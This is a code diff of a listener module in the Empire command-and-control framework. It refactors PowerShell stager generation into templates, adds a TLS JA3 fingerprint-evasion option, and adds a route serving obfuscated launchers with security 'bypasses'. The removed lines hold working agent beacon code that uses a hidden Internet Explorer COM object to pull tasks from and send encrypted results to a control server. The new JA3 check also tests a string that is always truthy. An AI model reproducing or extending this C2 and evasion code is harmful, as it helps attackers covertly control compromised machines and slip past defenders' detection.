@@ -16,7 +16,7 @@ from flask import Flask, make_response, render_template, request, send_from_dire
 from pydispatch import dispatcher
 from werkzeug.serving import WSGIRequestHandler
 
-from empire.server.common import encryption, helpers, packets
+from empire.server.common import encryption, helpers, packets, templating
 from empire.server.utils import data_util, listener_util
 
 
@@ -118,6 +118,12 @@ class Listener(object):
                 "Description": "Your Slack Incoming Webhook URL to communicate with your Slack instance.",
                 "Required": False,
                 "Value": "",
+            },
+            "JA3_Evasion": {
+                "Description": "Randomly generate a JA3/S signature using TLS ciphers.",
+                "Required": False,
+                "Value": "False",
+                "SuggestedValues": ["True", "False"],
             },
         }
 
@@ -356,17 +362,33 @@ class Listener(object):
         host = listenerOptions["Host"]["Value"]
         workingHours = listenerOptions["WorkingHours"]["Value"]
         customHeaders = profile.split("|")[2:]
+        killDate = listenerOptions["KillDate"]["Value"]
+        requestHeader = listenerOptions["RequestHeader"]["Value"]
 
         # select some random URIs for staging from the main profile
         stage1 = random.choice(uris)
         stage2 = random.choice(uris)
 
         if language.lower() == "powershell":
+            template_path = [
+                os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
+                os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
+            ]
 
-            # read in the stager base
-            f = open("%s/data/agent/stagers/http_com.ps1" % (self.mainMenu.installPath))
-            stager = f.read()
-            f.close()
+            eng = templating.TemplateEngine(template_path)
+            template = eng.get_template("http_com/http_com.ps1")
+
+            template_options = {
+                "working_hours": workingHours,
+                "request_header": requestHeader,
+                "kill_date": killDate,
+                "staging_key": stagingKey,
+                "profile": profile,
+                "host": host,
+                "stage_1": stage1,
+                "stage_2": stage2,
+            }
+            stager = template.render(template_options)
 
             # Get the random function name generated at install and patch the stager with the proper function name
             stager = data_util.keyword_obfuscation(stager)
@@ -393,24 +415,8 @@ class Listener(object):
                     '$customHeaders = "";', '$customHeaders = "' + headers + '";'
                 )
 
-            # patch the server and key information
-            stager = stager.replace("REPLACE_SERVER", host)
-            stager = stager.replace("REPLACE_STAGING_KEY", stagingKey)
-            stager = stager.replace("index.jsp", stage1)
-            stager = stager.replace("index.php", stage2)
-
-            # patch in working hours, if any
-            if workingHours != "":
-                stager = stager.replace("WORKING_HOURS_REPLACE", workingHours)
-
-            unobfuscated_stager = ""
             stagingKey = stagingKey.encode("UTF-8")
-
-            for line in stager.split("\n"):
-                line = line.strip()
-                # skip commented line
-                if not line.startswith("#"):
-                    unobfuscated_stager += line
+            unobfuscated_stager = listener_util.remove_lines_comments(stager)
 
             if obfuscate:
                 unobfuscated_stager = data_util.obfuscate(
@@ -474,12 +480,6 @@ class Listener(object):
             # Get the random function name generated at install and patch the stager with the proper function name
             code = data_util.keyword_obfuscation(code)
 
-            # patch in the comms methods
-            commsCode = self.generate_comms(
-                listenerOptions=listenerOptions, language=language
-            )
-            code = code.replace("REPLACE_COMMS", commsCode)
-
             # strip out comments and blank lines
             code = helpers.strip_powershell_comments(code)
 
@@ -523,104 +523,26 @@ class Listener(object):
 
         This is so agents can easily be dynamically updated for the new listener.
         """
+        host = listenerOptions["Host"]["Value"]
+        requestHeader = listenerOptions["RequestHeader"]["Value"]
 
         if language:
             if language.lower() == "powershell":
+                template_path = [
+                    os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
+                    os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
+                ]
 
-                updateServers = """
-                    $Script:ControlServers = @("%s");
-                    $Script:ServerIndex = 0;
+                eng = templating.TemplateEngine(template_path)
+                template = eng.get_template("http_com/http_com.ps1")
 
-                    if(-not $IE) {
-                        $Script:IE=New-Object -COM InternetExplorer.Application;
-                        $Script:IE.Silent = $True
-                        $Script:IE.visible = $False
-                    }
-                    else {
-                        $Script:IE = $IE
-                    }
+                template_options = {
+                    "host": host,
+                    "request_headers": requestHeader,
+                }
 
-                """ % (
-                    listenerOptions["Host"]["Value"]
-                )
-
-                getTask = """
-                    $script:GetTask = {
-                        try {
-                            if ($Script:ControlServers[$Script:ServerIndex].StartsWith("http")) {
-
-                                # meta 'TASKING_REQUEST' : 4
-                                $RoutingPacket = New-RoutingPacket -EncData $Null -Meta 4
-                                $RoutingCookie = [Convert]::ToBase64String($RoutingPacket)
-                                $Headers = "%s: $RoutingCookie"
-                                $script:Headers.GetEnumerator()| %%{ $Headers += "`r`n$($_.Name): $($_.Value)" }
-
-                                # choose a random valid URI for checkin
-                                $taskURI = $script:TaskURIs | Get-Random
-                                $ServerURI = $Script:ControlServers[$Script:ServerIndex] + $taskURI
-
-                                $Script:IE.navigate2($ServerURI, 14, 0, $Null, $Headers)
-                                while($Script:IE.busy -eq $true){Start-Sleep -Milliseconds 100}
-                                $html = $Script:IE.document.GetType().InvokeMember('body', [System.Reflection.BindingFlags]::GetProperty, $Null, $Script:IE.document, $Null).InnerHtml
-                                try {
-                                    [System.Convert]::FromBase64String($html)
-                                }
-                                catch {$Null}
-                            }
-                        }
-                        catch {
-                            $script:MissedCheckins += 1
-                            if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
-                                # restart key negotiation
-                                Start-Negotiate -S "$ser" -SK $SK -UA $ua
-                            }
-                        }
-                    }
-                """ % (
-                    listenerOptions["RequestHeader"]["Value"]
-                )
-
-                sendMessage = """
-                    $script:SendMessage = {
-                        param($Packets)
-
-                        if($Packets) {
-                            # build and encrypt the response packet
-                            $EncBytes = Encrypt-Bytes $Packets
-
-                            # build the top level RC4 "routing packet"
-                            # meta 'RESULT_POST' : 5
-                            $RoutingPacket = New-RoutingPacket -EncData $EncBytes -Meta 5
-
-                            $bytes=$e.GetBytes([System.Convert]::ToBase64String($RoutingPacket));
-
-                            if($Script:ControlServers[$Script:ServerIndex].StartsWith('http')) {
-
-                                $Headers = ""
-                                $script:Headers.GetEnumerator()| %{ $Headers += "`r`n$($_.Name): $($_.Value)" }
-                                $Headers.TrimStart("`r`n")
-
-                                try {
-                                    # choose a random valid URI for checkin
-                                    $taskURI = $script:TaskURIs | Get-Random
-                                    $ServerURI = $Script:ControlServers[$Script:ServerIndex] + $taskURI
-
-                                    $Script:IE.navigate2($ServerURI, 14, 0, $bytes, $Headers)
-                                    while($Script:IE.busy -eq $true){Start-Sleep -Milliseconds 100}
-                                }
-                                catch [System.Net.WebException]{
-                                    # exception posting data...
-                                    if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
-                                        # restart key negotiation
-                                        Start-Negotiate -S "$ser" -SK $SK -UA $ua
-                                    }
-                                }
-                            }
-                        }
-                    }
-                """
-
-                return updateServers + getTask + sendMessage
+                comms = template.render(template_options)
+                return comms
 
             else:
                 print(
@@ -647,6 +569,7 @@ class Listener(object):
         log = logging.getLogger("werkzeug")
         log.setLevel(logging.ERROR)
 
+        listenerName = listenerOptions["Name"]["Value"]
         bindIP = listenerOptions["BindIP"]["Value"]
         host = listenerOptions["Host"]["Value"]
         port = listenerOptions["Port"]["Value"]
@@ -658,6 +581,45 @@ class Listener(object):
 
         # Set HTTP/1.1 as in IIS 7.5 instead of /1.0
         WSGIRequestHandler.protocol_version = "HTTP/1.1"
+
+        @app.route("/download/<stager>/")
+        @app.route("/download/<stager>/<options>")
+        def send_stager(stager, options=None):
+            if "po" in stager:
+                if options:
+                    options = base64.b64decode(options).decode("UTF-8")
+                    options = options.split(":")
+
+                    obfuscate_command = options[0]
+                    bypasses = options[1]
+
+                    if obfuscate_command:
+                        obfuscate = True
+                    else:
+                        obfuscate = False
+
+                    if not bypasses:
+                        bypasses = ""
+
+                    launcher = self.mainMenu.stagers.generate_launcher(
+                        listenerName=listenerName,
+                        language="powershell",
+                        encode=False,
+                        obfuscate=obfuscate,
+                        obfuscationCommand=obfuscate_command,
+                        bypasses=bypasses,
+                    )
+                    return launcher
+                else:
+                    launcher = self.mainMenu.stagers.generate_launcher(
+                        listenerName=listenerName,
+                        language="powershell",
+                        encode=False,
+                    )
+                    return launcher
+
+            else:
+                return make_response(self.default_response(), 404)
 
         @app.before_request
         def check_ip():
@@ -677,7 +639,9 @@ class Listener(object):
 
         @app.after_request
         def change_header(response):
-            "Modify the headers response server."
+            """
+            Modify the headers response server.
+            """
             headers = listenerOptions["Headers"]["Value"]
             for key in headers.split("|"):
                 value = key.split(":")
@@ -686,7 +650,9 @@ class Listener(object):
 
         @app.after_request
         def add_proxy_headers(response):
-            "Add HTTP headers to avoid proxy caching."
+            """
+            Add HTTP headers to avoid proxy caching.
+            """
             response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
             response.headers["Pragma"] = "no-cache"
             response.headers["Expires"] = "0"
@@ -797,7 +763,7 @@ class Listener(object):
                                     # signal the client to restage
                                     print(
                                         helpers.color(
-                                            "[*] Orphaned agent from %s, signaling retaging"
+                                            "[*] Orphaned agent from %s, signaling restaging"
                                             % (clientIP)
                                         )
                                     )
@@ -925,6 +891,8 @@ class Listener(object):
         try:
             certPath = listenerOptions["CertPath"]["Value"]
             host = listenerOptions["Host"]["Value"]
+            ja3_evasion = listenerOptions["JA3_Evasion"]["Value"]
+
             if certPath.strip() != "" and host.startswith("https"):
                 certPath = os.path.abspath(certPath)
 
@@ -942,18 +910,10 @@ class Listener(object):
                     "%s/empire-chain.pem" % (certPath),
                     "%s/empire-priv.key" % (certPath),
                 )
-                # setting the cipher list allows for modification of the JA3 signature. Select a random cipher to change
-                # it every time the listener is launched
-                cipherlist = [
-                    "ECDHE-RSA-AES256-GCM-SHA384",
-                    "ECDHE-RSA-AES128-GCM-SHA256",
-                    "ECDHE-RSA-AES256-SHA384",
-                    "ECDHE-RSA-AES256-SHA",
-                    "AES256-SHA256",
-                    "AES128-SHA256",
-                ]
-                selectciph = random.choice(cipherlist)
-                context.set_ciphers(selectciph)
+
+                if ja3_evasion:
+                    context.set_ciphers(listener_util.generate_random_cipher())
+
                 app.run(host=bindIP, port=int(port), threaded=True, ssl_context=context)
             else:
                 app.run(host=bindIP, port=int(port), threaded=True)
